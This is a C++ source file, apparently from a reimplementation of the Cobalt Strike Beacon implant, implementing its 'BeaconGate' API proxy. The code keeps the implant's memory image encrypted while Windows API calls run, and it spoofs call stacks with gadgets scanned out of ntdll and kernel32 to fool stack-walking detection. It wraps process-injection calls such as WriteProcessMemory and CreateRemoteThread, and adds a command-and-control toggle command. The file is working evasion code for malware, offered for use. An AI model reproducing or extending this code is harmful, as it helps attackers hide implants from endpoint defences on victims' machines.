/* beacon_gate.cpp - BeaconGate (4.10 parity)
 *
 * Official contract (4.10 blog, arsenal-kit beacon_gate.[ch]): when
 * BeaconGate is enabled for a supported API, Beacon packs the call into a
 * FUNCTION_CALL {functionPtr, function, numOfArgs, args[], bMask, retValue}
 * and hands it to the gate executor. The executor is the sleepmask, and
 * there are three of them:
 *
 *   1. a user sleepmask BOF (gate_set_executor): it receives every gated
 *      call - and the sleep itself - and decides how to run it. bMask is
 *      its input, not an order.
 *   2. the built-in executor (default): bMask runs the call with the beacon
 *      image masked (mask-and-call), otherwise plain dispatch.
 *   3. spoofed (opt-in, GATE_MODE_SPOOF): the call executes on a private
 *      fake stack; an `add rsp, imm8; ret` gadget in a legit module is the
 *      callee's return address and hops back to the recovery stub with RAX
 *      intact.
 *
 * The spoof tier is NOT default. Its fake unwind chain does not line up
 * with the gadget's real frame (a walker would not see the spoolsv shape),
 * it is incompatible with CET shadow stacks, and its fake-stack page is a
 * process-wide singleton. It stays one flag away for research use.
 *
 * bMask follows the manual (p.279): a proxied API is masked by default.
 * The built-in mask switches itself off when Beacon is interactive
 * (sleep < 3s, to avoid the CPU spike), while worker threads run, after
 * BeaconDisableBeaconGateMasking(), and for CreateThread - the started
 * thread may execute beacon code while the image is ciphertext.
 *
 * Any init failure (no gadget, gen3 frames unavailable, mask engine
 * unavailable, x86) degrades to the next executor - the gate never breaks
 * the call.
 */

#include <windows.h>
#include <stdarg.h>
#include <string.h>
#include "beacon.h"
#include "gargleint.h" /* threadcount */
#include "commands.h"
#include "sleepmask_gen3.h"
#if defined(_M_X64) && defined(BOFWIN_ENABLE)
#include "sleepmask_bofwin.h" /* the mask engine (rl0k sleeve only) */
#endif
#include "beacon_gate.h"
#include "parse.h" /* datap/data_int (cmd 123 payload) */
#include "spawn_trace.h" /* spawn_log (probe) */

/* offsets mirror gate_spoof.asm exactly */
typedef struct {
	unsigned long long fn;         /* +0x00 */
	unsigned long long recovery;   /* +0x08 */
	unsigned long long saved_rsp;  /* +0x10 */
	unsigned long long pad;        /* +0x18 */
	unsigned long long result;     /* +0x20 */
	unsigned long long gadget;     /* +0x28 */
	unsigned long long fake_rsp;   /* +0x30 */
	unsigned long long args[4];    /* +0x38..+0x50 */
} GATE_SPOOFCTX;

#if defined(_M_X64)
extern "C" {
unsigned long long gate_spoof_execute(void * ctx); /* asm PROC - bare symbol */
void gate_spoof_recovery(void);                     /* asm PROC - bare symbol */
}
#endif

/* C-58: spoof-execution probe (called from gate_spoof_recovery in the
 * kdebug build; release spawn_log is a stub so the call is free) */
extern "C" const char gate_spoof_probe_tag[] = "gate: spoof exec fn=";
extern "C" void gate_spoof_probe(unsigned long long fn);

#if defined(_M_X64)
/* gate_tramp.asm, assembled for every x64 build: two 16-byte
 * `jmp qword ptr [rip+2]` stubs, the API slot at +8 of each */
extern "C" unsigned char gated_comms[];
#define GATE_COMMS_STRIDE 16

/* WinInet resolves its caller by return address and wants it inside an
 * image mapping (see gate_tramp.asm). A user sleepmask runs the call
 * from its own memory, so the two comms calls it is handed point here
 * instead - an executable section of ours the kit's masks leave alone
 * (beacon_info_fill: MaskSection FALSE) - and jump on to the real API. */
static void * gate_comms_stub(int api, void * fn)
{
	unsigned char * stub;
	void ** slot;
	DWORD old = 0, back = 0;

	if (api != GATE_API_INTERNETOPENA && api != GATE_API_INTERNETCONNECTA)
		return fn;
	stub = gated_comms + GATE_COMMS_STRIDE * api;
	if (stub[0] != 0xFF || stub[1] != 0x25)
		return fn;
	/* the section is read-only and executable: the slot opens for the one
	 * write, here while the image is in the clear (a mask comes later) */
	slot = (void **)(stub + 8);
	if (*slot != fn) {
		if (!VirtualProtect(slot, sizeof(void *), PAGE_READWRITE, &old))
			return fn;
		*slot = fn;
		VirtualProtect(slot, sizeof(void *), old, &back);
	}
	return stub;
}
#endif

static unsigned char *  g_gate_page;
static unsigned long long g_gate_pivot;
static unsigned long long g_gate_gadget;
static unsigned long    g_gate_hop;   /* 8 + gadget imm8: recovery slot offset */
static volatile long    g_gate_spoof_ready; /* 0=unknown, 1=ready, 2=plain */

static GATE_EXECUTOR g_gate_executor; /* user sleepmask BOF, or NULL */
static int           g_gate_busy;     /* re-entrancy guard (see gate_dispatch) */
static int           g_gate_off;      /* BeaconDisableBeaconGate() */
static int           g_gate_mask_off; /* BeaconDisableBeaconGateMasking() */

/* The settings the gate reads, as of gate_exit_snapshot(). safe_exit()
 * releases the settings table before ExitThread goes through the gate;
 * read through these, the exit call is decided the same way as every
 * call before it. */
static int g_gate_snap;
static int g_gate_snap_api, g_gate_snap_mode, g_gate_snap_nook, g_gate_snap_sleep;

static int gs_api(void)   { return g_gate_snap ? g_gate_snap_api    : setting_int(SETTING_BEACON_GATE_API); }
static int gs_mode(void)  { return g_gate_snap ? g_gate_snap_mode   : setting_int(SETTING_BEACON_GATE_MODE); }
static int gs_nook(void)  { return g_gate_snap ? g_gate_snap_nook   : setting_int(SETTING_GARGLE_NOOK); }
static int gs_sleep(void) { return g_gate_snap ? g_gate_snap_sleep  : setting_int(SETTING_SLEEPTIME); }

void gate_exit_snapshot(void)
{
	if (g_gate_snap)
		return;
	g_gate_snap_api   = setting_int(SETTING_BEACON_GATE_API);
	g_gate_snap_mode  = setting_int(SETTING_BEACON_GATE_MODE);
	g_gate_snap_nook  = setting_int(SETTING_GARGLE_NOOK);
	g_gate_snap_sleep = setting_int(SETTING_SLEEPTIME);
	g_gate_snap = 1;
}

/* if an API hangs, the mask engine's watchdog unmasks after this and the
 * call just keeps running unmasked */
#define GATE_MASK_WATCHDOG_MS 60000

/* ---------------- gate enablement ---------------- */

int gate_enabled(void)
{
	return g_gate_off == 0
	    && (gs_api() != 0
	    || gs_mode() != 0);
}

int gate_api_enabled(int api)
{
#if !defined(_M_X64)
	(void)api;
	return 0; /* the executors are x64 only; the wrappers stay the plain API */
#else
	if (!gate_enabled())
		return 0;
	if (gs_mode() & GATE_MODE_ALL)
		return 1;
	return (gs_api() & GATE_BIT(api)) != 0;
#endif
}

void gate_set_executor(GATE_EXECUTOR executor)
{
	g_gate_executor = executor;
}

void BeaconDisableBeaconGate(void)
{
	g_gate_off = 1;
}

void BeaconEnableBeaconGate(void)
{
	g_gate_off = 0;
}

void BeaconDisableBeaconGateMasking(void)
{
	g_gate_mask_off = 1;
}

void BeaconEnableBeaconGateMasking(void)
{
	g_gate_mask_off = 0;
}

/* ---------------- spoof tier init (x64) ---------------- */

#if defined(_M_X64)

/* scan a module's .text for `jmp [rbp-8]` (FF 65 F8) inside a function
 * whose unwind frame size covers our call area (retaddr+shadow+4 stack
 * args = 0x48); such a gadget both looks legit in walks and hops control
 * back to the recovery stub. */
static BOOL gate_find_gadget(unsigned long long * out_gadget, unsigned long long * out_extent)
{
	const char * mods[3] = { "ntdll.dll", "kernelbase.dll", "kernel32.dll" };
	int m;

	for (m = 0; m < 3; m++) {
		unsigned char * base = (unsigned char *)GetModuleHandleA(mods[m]);
		IMAGE_NT_HEADERS * nt;
		IMAGE_SECTION_HEADER * sec;
		int i;
		unsigned char * p;
		unsigned char * end;

		if (base == NULL)
			continue;
		nt = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
		sec = IMAGE_FIRST_SECTION(nt);
		for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
			if (memcmp(sec->Name, ".text", 5) != 0)
				continue;
			p = base + sec->VirtualAddress;
			end = p + sec->Misc.VirtualSize - 5;
			for (; p < end; p++) {
				DWORD sz = 0x48;
				/* add rsp, imm8; ret  (48 83 C4 xx C3): after fn's ret the
				 * gadget skips the dead shadow+stack-arg area and rets into
				 * the recovery address parked above the 8-arg slot block.
				 * The pop-rbp shape was unusable - its pop slots live in the
				 * fn-owned shadow space. */
				if (p[0] != 0x48 || p[1] != 0x83 || p[2] != 0xC4 || p[4] != 0xC3)
					continue;
				/* only 0x48/0x50: 8-aligned and strictly past the 8-arg
				 * stack block (0x28..0x48) - otherwise the parked recovery
				 * address would overlap an arg slot before the call */
				if (p[3] != 0x48 && p[3] != 0x50)
					continue;
				KD("gate: gadget hit mod=", (long)m);
				/* extent from the gadget address through its function frame;
				 * leaf/unwindless sites keep the 0x48 default */
				if (g3_gate_frame_size_at((unsigned long long)p, &sz) && sz > 0x48 && sz < 0x6000)
					sz = sz;
				else
					sz = 0x48;
				*out_gadget = (unsigned long long)p;
				*out_extent = sz;
				g_gate_hop = 8 + p[3];
				return TRUE;
			}
		}
	}
	return FALSE;
}

static void gate_init_spoof(void)
{
	unsigned long long fr[4];
	unsigned long long gadget = 0, extent = 0;
	unsigned long long slot;
	unsigned long sizes[4];
	int i;

	if (g_gate_spoof_ready != 0)
		return;

	g_gate_page = (unsigned char *)VirtualAlloc(NULL, 0x40000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (g_gate_page == NULL) {
		KD("gate: plain (no page)", 0);
		g_gate_spoof_ready = 2;
		return;
	}
	if (!g3_gate_frames(fr, sizes)) {
		KD("gate: plain (frames fail)", 0);
		g_gate_spoof_ready = 2;
		return;
	}
	if (!gate_find_gadget(&gadget, &extent)) {
		KD("gate: plain (no gadget)", 0);
		g_gate_spoof_ready = 2;
		return;
	}

	/* pivot: page + 0x8000 (= 8 mod 16, x64 ABI at fn entry). The gated
	 * call's ENTIRE call tree runs on this stack and grows DOWN from the
	 * pivot - 32KB headroom below, chain laid above toward the page top.
	 * (The first live round used page+0x48: 0x48 bytes of headroom could
	 * not hold InternetConnectA's deep tree.)
	 *
	 * Control-transfer via a `pop rbp; ret` gadget in a legit module:
	 *   [pivot+0x00] = gadget site (fn's return address - legit frame)
	 *   [pivot+0x08] = value popped into rbp (ctx+0x10)
	 *   [pivot+0x10] = recovery address (the gadget's ret lands here)
	 * fn preserves rbp (=ctx+0x10 from the asm prologue), so the popped
	 * value matches what gate_spoof_recovery expects. */
	/* pivot near the top: 252KB of headroom below for the gated call's
	 * tree, chain + parked recovery laid above toward the page end */
	/* pivot + 8: x64 ABI expects rsp==8 (mod 16) at fn ENTRY (a real call
	 * pushes an 8-byte retaddr onto an aligned rsp) - jmp does not push,
	 * so the pivot itself must carry the +8. Misaligned entry killed
	 * WININET!_tailMerge_iertutil_dll movdqa in InternetOpenA's tree. */
	g_gate_pivot = (unsigned long long)g_gate_page + 0x3f008;
	slot = g_gate_pivot + 0x80; /* above the parked recovery slot */
	if (slot + 0x300 > g_gate_pivot + 0x1000) { /* chain must fit the top margin */
		g_gate_spoof_ready = 2;
		return;
	}
	for (i = 0; i < 4; i++) {
		*(unsigned long long *)slot = fr[i];
		slot += sizes[i];
	}
	*(unsigned long long *)slot = 0; /* trailing NULL stops the unwind */

	g_gate_gadget = gadget;
	g_gate_spoof_ready = 1;
	KD("gate: spoof ready gadget=", (long)gadget);
}

#endif /* _M_X64 (spoof tier) */

/* ---------------- executors ---------------- */

/* one cast per arity: an exact call, never a wider one */
#define GATE_U unsigned long long

static unsigned long long gate_exec_plain(FUNCTION_CALL * fc)
{
	void * f = fc->functionPtr;
	GATE_U * a = fc->args;

	switch (fc->numOfArgs) {
	case 0:  return ((unsigned long long (WINAPI *)())f)();
	case 1:  return ((unsigned long long (WINAPI *)(GATE_U))f)(a[0]);
	case 2:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U))f)(a[0], a[1]);
	case 3:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2]);
	case 4:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3]);
	case 5:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4]);
	case 6:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5]);
	case 7:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6]);
	case 8:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
	case 9:  return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8]);
	default: return ((unsigned long long (WINAPI *)(GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U, GATE_U))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9]);
	}
}

extern "C" void gate_spoof_probe(unsigned long long fn) /* asm calls the bare symbol */
{
	spawn_log(gate_spoof_probe_tag, (long)fn);
}

/* when a call may be handed over with bMask set. The built-in mask engine
 * has one more rule (see gate_mask_allowed). */
static int gate_mask_allowed(int api)
{
	if (g_gate_mask_off || threadcount > 0)
		return 0;
	/* the gate mask is the sleep mask's job - no sleep mask, no gate mask */
	if (gs_nook() == 0)
		return 0;
	/* interactive Beacon skips the mask: it would only spin CPU (manual
	 * p.279). The one-shot exit is not interactive traffic - it keeps the
	 * scrub. */
	if (api != GATE_API_EXITTHREAD && gs_sleep() < 3000)
		return 0;
	/* CreateThread: the new thread may run beacon code (the CFG-safe
	 * trampoline calls back into the image) while the image is ciphertext
	 * - for every executor */
	if (api == GATE_API_CREATETHREAD)
		return 0;
	return 1;
}

/* the built-in mask engine runs the whole call with the image ciphertext,
 * so nothing of ours may execute in this process until it returns */
static int gate_mask_run(FUNCTION_CALL * fc)
{
#if defined(_M_X64) && defined(BOFWIN_ENABLE)
	/* ExitThread never returns: no watchdog, or its timer thread would put
	 * the image back in plaintext right after the session died */
	int served;
	/* logged BEFORE the window: the probes below are written from behind
	 * it, and a call that never returns (ExitThread) leaves none of them */
	KD("gate: masking api=", fc->function);
	served = bofwin_call((void *)fc->functionPtr, fc->args, fc->numOfArgs, &fc->retValue,
	                     fc->function == GATE_API_EXITTHREAD ? 0 : GATE_MASK_WATCHDOG_MS);
	KD(served ? "gate: masked api=" : "gate: mask unserved api=", fc->function);
	KD(served ? "gate: masked ret=" : "gate: unserved ret=", (long)fc->retValue);
	{
		int before = 0, after = 0;
		bofwin_test_blocks(&before, &after);
		KD("gate: mask blocks before=", (long)before);
		KD("gate: mask blocks after=", (long)after);
		KD("gate: mask tramp=", (long)(LONG_PTR)bofwin_test_tramp());
	}
	return served;
#else
	(void)fc;
	return 0; /* no engine in this build (the TS-slot DLL, x86) */
#endif
}

unsigned long long gate_dispatch(FUNCTION_CALL * fc)
{
	int done = 0;

	if (fc->numOfArgs > MAX_BEACON_GATE_ARGUMENTS)
		fc->numOfArgs = MAX_BEACON_GATE_ARGUMENTS;

	/* a call made from inside an executor (the mask engine's teardown,
	 * code a user sleepmask ran) must not re-enter it */
	if (g_gate_busy) {
		fc->retValue = gate_exec_plain(fc);
		return fc->retValue;
	}

	g_gate_busy = 1;
	KD("gate: call api=", fc->function);
	fc->bMask = fc->bMask && gate_mask_allowed(fc->function);

	if (g_gate_executor != NULL) {
#if defined(_M_X64)
		/* the comms calls enter the API through our own image */
		void * fn = fc->functionPtr;
		fc->functionPtr = gate_comms_stub(fc->function, fn);
		done = g_gate_executor(fc);
		fc->functionPtr = fn;
#else
		done = g_gate_executor(fc);
#endif
		KD(done ? "gate: executor ran api=" : "gate: executor declined api=", fc->function);
	}
#if defined(_M_X64)
	if (!done) {
		GATE_SPOOFCTX ctx;
		int i;

		/* the spoofed executor is opt-in (setting 97 bit 1); init failure
		 * degrades to the next executor */
		if (g_gate_spoof_ready == 0 && (gs_mode() & GATE_MODE_SPOOF))
			gate_init_spoof();

		if (g_gate_spoof_ready == 1) {
			memset(&ctx, 0, sizeof(ctx));
			ctx.fn       = (unsigned long long)fc->functionPtr;
			ctx.recovery = (unsigned long long)&gate_spoof_recovery;
			ctx.gadget   = g_gate_gadget;
			ctx.fake_rsp = g_gate_pivot;
			for (i = 0; i < 4 && i < fc->numOfArgs; i++)
				ctx.args[i] = fc->args[i];
			/* add-rsp hop: park the recovery address above the 8-arg stack
			 * block; the gadget skips the dead shadow+args area and rets here
			 * (rbp survives the call = ctx+0x10, as the asm prologue set it) */
			*(unsigned long long *)(g_gate_pivot + g_gate_hop) =
				(unsigned long long)&gate_spoof_recovery;
			/* stack args 5..8 pre-lay into the fake frame's arg area */
			for (i = 4; i < fc->numOfArgs && i < 8; i++)
				*(unsigned long long *)(g_gate_pivot + 0x28 + 8 * (i - 4)) = fc->args[i];
			fc->retValue = gate_spoof_execute(&ctx);
			done = 1;
		}
		else if (fc->bMask && gate_mask_run(fc)) {
			done = 1;
		}
	}
#endif
	if (!done)
		fc->retValue = gate_exec_plain(fc);

	g_gate_busy = 0;
	return fc->retValue;
}

unsigned long long gate_call(void * fn, int api, int n, ...)
{
	FUNCTION_CALL fc;
	va_list ap;
	int i;

	memset(&fc, 0, sizeof(fc));
	fc.functionPtr = fn;
	fc.function    = api;
	fc.numOfArgs   = n;
	fc.bMask       = TRUE;
	va_start(ap, n);
	for (i = 0; i < n && i < MAX_BEACON_GATE_ARGUMENTS; i++)
		fc.args[i] = va_arg(ap, unsigned long long);
	va_end(ap);
	return gate_dispatch(&fc);
}

#define GATE_PTR(p) ((unsigned long long)(ULONG_PTR)(p))

/* ---------------- gate wrappers ----------------
 * Each one is the API with the gate in front: off -> the plain call.
 * Every argument is widened to unsigned long long before gate_call:
 * a 32-bit value passed through `...` is only guaranteed in the low
 * half of its slot. */

LPVOID gate_VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD protect)
{
	if (!gate_api_enabled(GATE_API_VIRTUALALLOC))
		return VirtualAlloc(addr, size, type, protect);
	return (LPVOID)(ULONG_PTR)gate_call((void *)VirtualAlloc, GATE_API_VIRTUALALLOC, 4,
		GATE_PTR(addr), (unsigned long long)(size),
		(unsigned long long)(type), (unsigned long long)(protect));
}

LPVOID gate_VirtualAllocEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD type, DWORD protect)
{
	if (!gate_api_enabled(GATE_API_VIRTUALALLOCEX))
		return VirtualAllocEx(proc, addr, size, type, protect);
	return (LPVOID)(ULONG_PTR)gate_call((void *)VirtualAllocEx, GATE_API_VIRTUALALLOCEX, 5,
		GATE_PTR(proc), GATE_PTR(addr), (unsigned long long)(size),
		(unsigned long long)(type), (unsigned long long)(protect));
}

BOOL gate_VirtualProtect(LPVOID addr, SIZE_T size, DWORD protect, PDWORD old)
{
	if (!gate_api_enabled(GATE_API_VIRTUALPROTECT))
		return VirtualProtect(addr, size, protect, old);
	return (BOOL)(ULONG_PTR)gate_call((void *)VirtualProtect, GATE_API_VIRTUALPROTECT, 4,
		GATE_PTR(addr), (unsigned long long)(size),
		(unsigned long long)(protect), GATE_PTR(old));
}

BOOL gate_VirtualProtectEx(HANDLE proc, LPVOID addr, SIZE_T size, DWORD protect, PDWORD old)
{
	if (!gate_api_enabled(GATE_API_VIRTUALPROTECTEX))
		return VirtualProtectEx(proc, addr, size, protect, old);
	return (BOOL)(ULONG_PTR)gate_call((void *)VirtualProtectEx, GATE_API_VIRTUALPROTECTEX, 5,
		GATE_PTR(proc), GATE_PTR(addr), (unsigned long long)(size),
		(unsigned long long)(protect), GATE_PTR(old));
}

BOOL gate_VirtualFree(LPVOID addr, SIZE_T size, DWORD freetype)
{
	if (!gate_api_enabled(GATE_API_VIRTUALFREE))
		return VirtualFree(addr, size, freetype);
	return (BOOL)(ULONG_PTR)gate_call((void *)VirtualFree, GATE_API_VIRTUALFREE, 3,
		GATE_PTR(addr), (unsigned long long)(size), (unsigned long long)(freetype));
}

SIZE_T gate_VirtualQuery(LPCVOID addr, PMEMORY_BASIC_INFORMATION mbi, SIZE_T len)
{
	if (!gate_api_enabled(GATE_API_VIRTUALQUERY))
		return VirtualQuery(addr, mbi, len);
	return (SIZE_T)(ULONG_PTR)gate_call((void *)VirtualQuery, GATE_API_VIRTUALQUERY, 3,
		GATE_PTR(addr), GATE_PTR(mbi), (unsigned long long)(len));
}

HANDLE gate_OpenProcess(DWORD access, BOOL inherit, DWORD pid)
{
	if (!gate_api_enabled(GATE_API_OPENPROCESS))
		return OpenProcess(access, inherit, pid);
	return (HANDLE)(ULONG_PTR)gate_call((void *)OpenProcess, GATE_API_OPENPROCESS, 3,
		(unsigned long long)(access), (unsigned long long)(inherit), (unsigned long long)(pid));
}

HANDLE gate_OpenThread(DWORD access, BOOL inherit, DWORD tid)
{
	if (!gate_api_enabled(GATE_API_OPENTHREAD))
		return OpenThread(access, inherit, tid);
	return (HANDLE)(ULONG_PTR)gate_call((void *)OpenThread, GATE_API_OPENTHREAD, 3,
		(unsigned long long)(access), (unsigned long long)(inherit), (unsigned long long)(tid));
}

BOOL gate_CloseHandle(HANDLE h)
{
	if (!gate_api_enabled(GATE_API_CLOSEHANDLE))
		return CloseHandle(h);
	return (BOOL)(ULONG_PTR)gate_call((void *)CloseHandle, GATE_API_CLOSEHANDLE, 1,
		GATE_PTR(h));
}

BOOL gate_DuplicateHandle(HANDLE sp, HANDLE sh, HANDLE tp, LPHANDLE th, DWORD access, BOOL inherit, DWORD options)
{
	if (!gate_api_enabled(GATE_API_DUPLICATEHANDLE))
		return DuplicateHandle(sp, sh, tp, th, access, inherit, options);
	return (BOOL)(ULONG_PTR)gate_call((void *)DuplicateHandle, GATE_API_DUPLICATEHANDLE, 7,
		GATE_PTR(sp), GATE_PTR(sh), GATE_PTR(tp), GATE_PTR(th),
		(unsigned long long)(access), (unsigned long long)(inherit), (unsigned long long)(options));
}

BOOL gate_ReadProcessMemory(HANDLE proc, LPCVOID base, LPVOID buf, SIZE_T n, SIZE_T * read)
{
	if (!gate_api_enabled(GATE_API_READPROCESSMEMORY))
		return ReadProcessMemory(proc, base, buf, n, read);
	return (BOOL)(ULONG_PTR)gate_call((void *)ReadProcessMemory, GATE_API_READPROCESSMEMORY, 5,
		GATE_PTR(proc), GATE_PTR(base), GATE_PTR(buf),
		(unsigned long long)(n), GATE_PTR(read));
}

BOOL gate_WriteProcessMemory(HANDLE proc, LPVOID base, LPCVOID buf, SIZE_T n, SIZE_T * written)
{
	if (!gate_api_enabled(GATE_API_WRITEPROCESSMEMORY))
		return WriteProcessMemory(proc, base, buf, n, written);
	return (BOOL)(ULONG_PTR)gate_call((void *)WriteProcessMemory, GATE_API_WRITEPROCESSMEMORY, 5,
		GATE_PTR(proc), GATE_PTR(base), GATE_PTR(buf),
		(unsigned long long)(n), GATE_PTR(written));
}

BOOL gate_GetThreadContext(HANDLE thread, CONTEXT * ctx)
{
	if (!gate_api_enabled(GATE_API_GETTHREADCONTEXT))
		return GetThreadContext(thread, ctx);
	return (BOOL)(ULONG_PTR)gate_call((void *)GetThreadContext, GATE_API_GETTHREADCONTEXT, 2,
		GATE_PTR(thread), GATE_PTR(ctx));
}

BOOL gate_SetThreadContext(HANDLE thread, CONTEXT * ctx)
{
	if (!gate_api_enabled(GATE_API_SETTHREADCONTEXT))
		return SetThreadContext(thread, ctx);
	return (BOOL)(ULONG_PTR)gate_call((void *)SetThreadContext, GATE_API_SETTHREADCONTEXT, 2,
		GATE_PTR(thread), GATE_PTR(ctx));
}

DWORD gate_ResumeThread(HANDLE thread)
{
	if (!gate_api_enabled(GATE_API_RESUMETHREAD))
		return ResumeThread(thread);
	return (DWORD)(ULONG_PTR)gate_call((void *)ResumeThread, GATE_API_RESUMETHREAD, 1,
		GATE_PTR(thread));
}

HANDLE gate_CreateThread(LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD id)
{
	if (!gate_api_enabled(GATE_API_CREATETHREAD))
		return CreateThread(sa, stack, start, param, flags, id);
	return (HANDLE)(ULONG_PTR)gate_call((void *)CreateThread, GATE_API_CREATETHREAD, 6,
		GATE_PTR(sa), (unsigned long long)(stack), GATE_PTR(start),
		GATE_PTR(param), (unsigned long long)(flags), GATE_PTR(id));
}

HANDLE gate_CreateRemoteThread(HANDLE proc, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD id)
{
	if (!gate_api_enabled(GATE_API_CREATEREMOTETHREAD))
		return CreateRemoteThread(proc, sa, stack, start, param, flags, id);
	return (HANDLE)(ULONG_PTR)gate_call((void *)CreateRemoteThread, GATE_API_CREATEREMOTETHREAD, 7,
		GATE_PTR(proc), GATE_PTR(sa), (unsigned long long)(stack), GATE_PTR(start),
		GATE_PTR(param), (unsigned long long)(flags), GATE_PTR(id));
}

HANDLE gate_CreateFileMappingA(HANDLE file, LPSECURITY_ATTRIBUTES sa, DWORD protect, DWORD high, DWORD low, const char * name)
{
	if (!gate_api_enabled(GATE_API_CREATEFILEMAPPINGA))
		return CreateFileMappingA(file, sa, protect, high, low, name);
	return (HANDLE)(ULONG_PTR)gate_call((void *)CreateFileMappingA, GATE_API_CREATEFILEMAPPINGA, 6,
		GATE_PTR(file), GATE_PTR(sa), (unsigned long long)(protect),
		(unsigned long long)(high), (unsigned long long)(low), GATE_PTR(name));
}

LPVOID gate_MapViewOfFile(HANDLE map, DWORD access, DWORD high, DWORD low, SIZE_T size)
{
	if (!gate_api_enabled(GATE_API_MAPVIEWOFFILE))
		return MapViewOfFile(map, access, high, low, size);
	return (LPVOID)(ULONG_PTR)gate_call((void *)MapViewOfFile, GATE_API_MAPVIEWOFFILE, 5,
		GATE_PTR(map), (unsigned long long)(access), (unsigned long long)(high),
		(unsigned long long)(low), (unsigned long long)(size));
}

BOOL gate_UnmapViewOfFile(LPCVOID base)
{
	if (!gate_api_enabled(GATE_API_UNMAPVIEWOFFILE))
		return UnmapViewOfFile(base);
	return (BOOL)(ULONG_PTR)gate_call((void *)UnmapViewOfFile, GATE_API_UNMAPVIEWOFFILE, 1,
		GATE_PTR(base));
}

void gate_ExitThread(DWORD exitcode)
{
	if (!gate_api_enabled(GATE_API_EXITTHREAD)) {
		ExitThread(exitcode);
		return;
	}
	/* the executor is expected to run the call; reaching the next line
	 * means a user sleepmask declined it */
	(void)gate_call((void *)ExitThread, GATE_API_EXITTHREAD, 1, (unsigned long long)exitcode);
	ExitThread(exitcode);
}

/* ---------------- runtime toggle (command 123) ---------------- */

void command_beacon_gate(char * buffer, int length, void (*callback)(char * buffer, int length, int type))
{
	datap parser;
	int enable;

	data_init(&parser, buffer, length);
	enable = data_int(&parser);

	/* 0 = off, anything else = on. This is a switch over the profile's
	 * configuration, not a rewrite of it: `beacon_gate disable` followed
	 * by `beacon_gate enable` restores exactly what the profile asked for
	 * (and leaves the sleep mask alone either way). */
	if (enable)
		BeaconEnableBeaconGate();
	else
		BeaconDisableBeaconGate();

	callback((char *)"", 0, CALLBACK_OUTPUT);
}
